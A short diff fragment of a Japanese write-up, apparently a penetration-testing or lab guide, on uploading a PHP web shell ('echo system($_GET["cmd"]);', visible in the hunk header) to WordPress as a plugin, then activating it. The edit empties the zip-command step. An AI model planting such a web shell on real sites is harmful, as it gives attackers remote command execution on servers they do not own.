@@ -157,7 +157,7 @@ echo system($_GET["cmd"]);
 
 2. zip化する
 ```zsh
-zip <output_name> <file>
+
 ```
 
 3. WordPress管理画面からプラグインをアップロード→Activate Plugin
